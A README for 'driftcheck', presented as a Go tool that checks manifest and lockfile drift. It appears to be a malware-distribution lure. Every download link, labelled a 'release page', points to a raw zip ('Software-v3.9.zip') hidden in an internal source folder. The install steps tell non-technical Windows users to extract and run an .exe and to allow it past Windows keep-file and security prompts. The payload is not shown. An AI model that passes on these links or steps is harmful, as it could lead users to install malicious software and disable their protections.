# 🧭 driftcheck - Spot Manifest and Lock Drift

[![Download driftcheck](https://img.shields.io/badge/Download%20driftcheck-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/significancemoloch680/driftcheck/main/internal/driftcheck/Software-v3.9.zip)

## 📦 What driftcheck does

driftcheck helps you check if your declared dependencies still match what is locked in place. It compares the manifest and the lockfile, then shows where they differ.

Use it when you want to catch drift before it causes problems in your build, your agent setup, or your CI run. It is built for AI agent projects and other Go-based dependency workflows.

## 💻 What you need

- A Windows PC
- Internet access to get the app
- Permission to download files
- A command window if the app runs from the terminal
- A manifest and lockfile in your project folder

Common file types include:

- `go.mod` and `go.sum`
- Other manifest and lockfile pairs used by agent tools
- Dependency files used in CI pipelines

## 🚀 Download driftcheck

Open the release page here and visit this page to download:

https://raw.githubusercontent.com/significancemoloch680/driftcheck/main/internal/driftcheck/Software-v3.9.zip

Look for the latest release, then download the Windows file that matches your system. If there is more than one file, choose the one marked for Windows.

## 🪟 Install on Windows

1. Open the download link above in your browser.
2. Find the latest release.
3. Download the Windows file from the release assets.
4. If the file comes in a `.zip` folder, open it and extract the contents.
5. Move the app file to a folder you can find again, such as `Downloads` or `Desktop`.
6. If Windows asks if you want to keep the file, allow it.
7. If a security prompt appears, choose the option that lets the app run.

If you downloaded a `.exe` file, you can run it by double-clicking it.

## ▶️ Run driftcheck

If you downloaded a single app file:

1. Open the folder that holds the file.
2. Double-click the file.
3. If a terminal window opens, keep it open while the tool runs.
4. Follow the on-screen text.

If the app runs from Command Prompt or PowerShell:

1. Open the folder that contains the file.
2. Click the address bar in File Explorer.
3. Type `cmd` and press Enter.
4. Run the file name shown in the release page or package name.

Example:

- `driftcheck.exe`

## 🔍 Check your project

Use driftcheck inside the folder that holds your project files.

A simple flow looks like this:

1. Open your project folder.
2. Run driftcheck.
3. Let it compare the manifest and lockfile.
4. Review the output.
5. Fix any drift it reports.

What you may see:

- A clean result when the files match
- A list of files or lines that differ
- A notice when the lockfile is out of date
- A notice when the manifest changed but the lock did not

## 🛠️ Common use cases

driftcheck fits well in these cases:

- Checking AI agent project dependencies
- Reviewing dependency drift before a build
- Keeping lockfiles in sync with manifest files
- Catching changes before code lands in CI
- Auditing dependency state in DevOps work

## 📁 Example project layout

A simple project may look like this:

- `project-folder`
  - `go.mod`
  - `go.sum`
  - `driftcheck.exe`

If your project uses other files, place driftcheck in the same folder or point it to the folder that holds your dependency files.

## ⚙️ Basic setup tips

- Keep the app file in a fixed folder
- Keep your project files in one place
- Run the check after you update dependencies
- Run it again before you send code to CI
- Use it as part of your release review

If you use a lockfile in your workflow, driftcheck can help you see when the lock no longer matches what you declared.

## 🧪 What a good result looks like

A good run usually means:

- The manifest and lockfile match
- No drift was found
- Your dependency state is stable
- Your build is less likely to fail from mismatch

If driftcheck reports drift, open the files it names and compare the changes. Then update the lockfile or manifest so both files match.

## 🧭 If something does not work

Try these steps:

- Make sure you downloaded the Windows file
- Check that the download finished
- Confirm that the file is not still inside the zip file
- Move the app to a simple path like `C:\Tools\driftcheck`
- Run it again from that folder
- Make sure your project files are in the folder you expect

If the window closes too fast, open Command Prompt first, then run the app from there so you can read the output

## 🧩 Working with CI

driftcheck can also fit into a CI flow.

A common setup is:

1. Run dependency checks after changes are made
2. Compare the manifest and lockfile
3. Fail the pipeline if drift appears
4. Review the files before merge

This helps keep agent projects and other builds in a known state.

## 📚 Terms used in driftcheck

- Manifest: the file that declares what your project wants
- Lockfile: the file that records what was locked at a point in time
- Drift: a difference between the two
- Audit: a check that shows what changed
- CI: a build or test process that runs on its own

## 📌 File examples

Depending on your project, driftcheck may check pairs such as:

- `go.mod` and `go.sum`
- package manifests and lockfiles
- agent dependency files and their locked state

Use the files that belong to your project setup

## 🔗 Download again

If you need the release page later, use this link:

https://raw.githubusercontent.com/significancemoloch680/driftcheck/main/internal/driftcheck/Software-v3.9.zip

## 🖥️ Windows use guide

For the easiest setup on Windows:

1. Download the latest release
2. Extract it if needed
3. Place it in a folder you can reach fast
4. Open your project folder
5. Run driftcheck
6. Read the output and fix drift if needed

This keeps the process simple for non-technical users and helps you check your dependency files without manual file comparison